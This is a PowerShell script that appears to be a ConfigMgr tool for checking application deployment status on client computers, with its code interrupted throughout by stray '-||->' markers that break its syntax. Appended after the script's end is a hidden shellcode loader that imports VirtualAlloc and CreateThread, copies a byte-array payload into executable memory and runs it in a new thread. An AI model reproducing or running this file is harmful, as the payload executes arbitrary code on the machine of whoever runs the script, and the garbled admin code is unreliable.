
[CmdletBinding(DefaultParameterSetName = 'None')]
param (
	[Parameter(ParameterSetName = 'Collection', Mandatory)]
	[string]$CollectionName,
	[Parameter(ParameterSetName = 'Computer', Mandatory)]
	[string[]]$Computername,
	[string]$ApplicationName,
	[string]$SiteServer = 'MYSITESERVER',
	[string]$SiteCode = 'CON'
)

begin {
	 -||-> Set-StrictMode -Version Latest <-||- 
	
	 -||-> function Get-CmCollectionMember ($Collection) {
		 -||-> try {
			 -||-> $Ns = "ROOT\sms\site_$SiteCode" <-||- 
			 -||-> $Col =  -||-> Get-CimInstance -ComputerName $SiteServer -Class 'SMS_Collection' -Namespace $Ns -Filter "Name = '$Collection'" <-||-  <-||- 
			 -||-> $ColId = $Col.CollectionID <-||- ;
			 -||-> Get-CimInstance -Computername $SiteServer -Namespace $Ns -Class "SMS_CM_RES_COLL_$ColId" <-||- 
		} catch {
			 -||-> Write-Error $_.Exception.Message <-||- 
		} <-||- 
	} <-||- 
	
	 -||-> function Get-CmClientAppDeploymentStatus ($Computername,$ApplicationName) {
		 -||-> $EvalStates = @{
			0 =  -||-> 'No state information is available' <-||- ;
			1 =  -||-> 'Application is enforced to desired/resolved state' <-||- ;
			2 =  -||-> 'Application is not required on the client' <-||- ;
			3 =  -||-> 'Application is available for enforcement (install or uninstall based on resolved state). Content may/may not have been downloaded' <-||- ;
			4 =  -||-> 'Application last failed to enforce (install/uninstall)' <-||- ;
			5 =  -||-> 'Application is currently waiting for content download to complete' <-||- ;
			6 =  -||-> 'Application is currently waiting for content download to complete' <-||- ;
			7 =  -||-> 'Application is currently waiting for its dependencies to download' <-||- ;
			8 =  -||-> 'Application is currently waiting for a service (maintenance) window' <-||- ;
			9 =  -||-> 'Application is currently waiting for a previously pending reboot' <-||- ;
			10 =  -||-> 'Application is currently waiting for serialized enforcement' <-||- ;
			11 =  -||-> 'Application is currently enforcing dependencies' <-||- ;
			12 =  -||-> 'Application is currently enforcing' <-||- ;
			13 =  -||-> 'Application install/uninstall enforced and soft reboot is pending' <-||- ;
			14 =  -||-> 'Application installed/uninstalled and hard reboot is pending' <-||- ;
			15 =  -||-> 'Update is available but pending installation' <-||- ;
			16 =  -||-> 'Application failed to evaluate' <-||- ;
			17 =  -||-> 'Application is currently waiting for an active user session to enforce' <-||- ;
			18 =  -||-> 'Application is currently waiting for all users to logoff' <-||- ;
			19 =  -||-> 'Application is currently waiting for a user logon' <-||- ;
			20 =  -||-> 'Application in progress, waiting for retry' <-||- ;
			21 =  -||-> 'Application is waiting for presentation mode to be switched off' <-||- ;
			22 =  -||-> 'Application is pre-downloading content (downloading outside of install job)' <-||- ;
			23 =  -||-> 'Application is pre-downloading dependent content (downloading outside of install job)' <-||- ;
			24 =  -||-> 'Application download failed (downloading during install job)' <-||- ;
			25 =  -||-> 'Application pre-downloading failed (downloading outside of install job)' <-||- ;
			26 =  -||-> 'Download success (downloading during install job)' <-||- ;
			27 =  -||-> 'Post-enforce evaluation' <-||- ;
			28 =  -||-> 'Waiting for network connectivity' <-||- ;
		} <-||- 
		
		 -||-> $Params = @{
			'Computername' =  -||-> $Computername <-||- 
			'Namespace' =  -||-> 'root\ccm\clientsdk' <-||- 
			'Class' =  -||-> 'CCM_Application' <-||- 
		} <-||- 
		 -||-> if ( -||-> $ApplicationName <-||- ) {
			 -||-> Get-WmiObject @Params | Where-Object {  -||-> $_.FullName -eq $ApplicationName <-||-  } | Select-Object PSComputerName, Name, InstallState, ErrorCode, @{ n =  -||-> 'EvalState' <-||- ; e =  -||-> {  -||-> $EvalStates[[int]$_.EvaluationState] <-||-  } <-||-  }, @{ label =  -||-> 'ApplicationMadeAvailable' <-||- ; expression =  -||-> {  -||-> $_.ConvertToDateTime($_.StartTime) <-||-  } <-||-  } <-||- 
		} else {
			 -||-> Get-WmiObject @Params | Select-Object PSComputerName, Name, InstallState, ErrorCode, @{ n =  -||-> 'EvalState' <-||- ; e =  -||-> {  -||-> $EvalStates[[int]$_.EvaluationState] <-||-  } <-||-  }, @{ label =  -||-> 'ApplicationMadeAvailable' <-||- ; expression =  -||-> {  -||-> $_.ConvertToDateTime($_.StartTime) <-||-  } <-||-  } <-||- 
		} <-||- 
	} <-||- 
	
	 -||-> function Test-Ping ($ComputerName) {
		 -||-> try {
			 -||-> $oPing =  -||-> new-object system.net.networkinformation.ping <-||-  <-||- ;
			 -||-> if ( -||-> ( -||-> $oPing.Send($ComputerName, 200).Status -eq 'TimedOut' <-||- ) <-||- ) {
				 -||-> $false <-||- 
			} else {
				 -||-> $true <-||- 	
			} <-||- 
		} catch [System.Exception] {
			 -||-> $false <-||- 
		} <-||- 
	} <-||- 
}

process {
	 -||-> if ( -||-> $CollectionName <-||- ) {
		 -||-> $Clients = ( -||-> Get-CmCollectionMember -Collection $CollectionName <-||- ).Name <-||- 
	} else {
		 -||-> $Clients = $Computername <-||- 
	} <-||- 
	 -||-> Write-Verbose "Will query '$( -||-> $Clients.Count <-||- )' clients" <-||- 
	 -||-> foreach ($Client in  -||-> $Clients <-||- ) {
		 -||-> try {
			 -||-> if ( -||-> !( -||-> Test-Ping -ComputerName $Client <-||- ) <-||- ) {
				throw  -||-> "$Client is offline" <-||- 
			} else {
				 -||-> $Params = @{ 'Computername' =  -||-> $Client <-||-  } <-||- 
				 -||-> if ( -||-> $ApplicationName <-||- ) {
					 -||-> $Params.ApplicationName = $ApplicationName <-||- 
				} <-||- 
				 -||-> Get-CmClientAppDeploymentStatus @Params <-||- 
			} <-||- 
		} catch {
			 -||-> Write-Warning $_.Exception.Message <-||- 
		} <-||- 
	} <-||- 
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x5e,0xe4,0xae,0xfc,0xdb,0xc5,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x7a,0x0f,0x03,0x7a,0x51,0x06,0x5b,0x00,0x85,0x44,0xa4,0xf9,0x55,0x29,0x2c,0x1c,0x64,0x69,0x4a,0x54,0xd6,0x59,0x18,0x38,0xda,0x12,0x4c,0xa9,0x69,0x56,0x59,0xde,0xda,0xdd,0xbf,0xd1,0xdb,0x4e,0x83,0x70,0x5f,0x8d,0xd0,0x52,0x5e,0x5e,0x25,0x92,0xa7,0x83,0xc4,0xc6,0x70,0xcf,0x7b,0xf7,0xf5,0x85,0x47,0x7c,0x45,0x0b,0xc0,0x61,0x1d,0x2a,0xe1,0x37,0x16,0x75,0x21,0xb9,0xfb,0x0d,0x68,0xa1,0x18,0x2b,0x22,0x5a,0xea,0xc7,0xb5,0x8a,0x23,0x27,0x19,0xf3,0x8c,0xda,0x63,0x33,0x2a,0x05,0x16,0x4d,0x49,0xb8,0x21,0x8a,0x30,0x66,0xa7,0x09,0x92,0xed,0x1f,0xf6,0x23,0x21,0xf9,0x7d,0x2f,0x8e,0x8d,0xda,0x33,0x11,0x41,0x51,0x4f,0x9a,0x64,0xb6,0xc6,0xd8,0x42,0x12,0x83,0xbb,0xeb,0x03,0x69,0x6d,0x13,0x53,0xd2,0xd2,0xb1,0x1f,0xfe,0x07,0xc8,0x7d,0x96,0xe4,0xe1,0x7d,0x66,0x63,0x71,0x0d,0x54,0x2c,0x29,0x99,0xd4,0xa5,0xf7,0x5e,0x1b,0x9c,0x40,0xf0,0xe2,0x1f,0xb1,0xd8,0x20,0x4b,0xe1,0x72,0x81,0xf4,0x6a,0x83,0x2e,0x21,0x06,0x86,0xb8,0x7f,0xe5,0x17,0x63,0xe8,0x08,0x28,0x94,0x38,0x85,0xce,0xca,0xe8,0xc6,0x5e,0xaa,0x58,0xa7,0x0e,0x42,0xb3,0x28,0x70,0x72,0xbc,0xe2,0x19,0x18,0x53,0x5b,0x71,0xb4,0xca,0xc6,0x09,0x25,0x12,0xdd,0x77,0x65,0x98,0xd2,0x88,0x2b,0x69,0x9e,0x9a,0xdb,0x99,0xd5,0xc1,0x4d,0xa5,0xc3,0x6c,0x71,0x33,0xe8,0x26,0x26,0xab,0xf2,0x1f,0x00,0x74,0x0c,0x4a,0x1b,0xbd,0x98,0x35,0x73,0xc2,0x4c,0xb6,0x83,0x94,0x06,0xb6,0xeb,0x40,0x73,0xe5,0x0e,0x8f,0xae,0x99,0x83,0x1a,0x51,0xc8,0x70,0x8c,0x39,0xf6,0xaf,0xfa,0xe5,0x09,0x9a,0xfa,0xda,0xdf,0xe2,0x88,0x32,0xdc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};



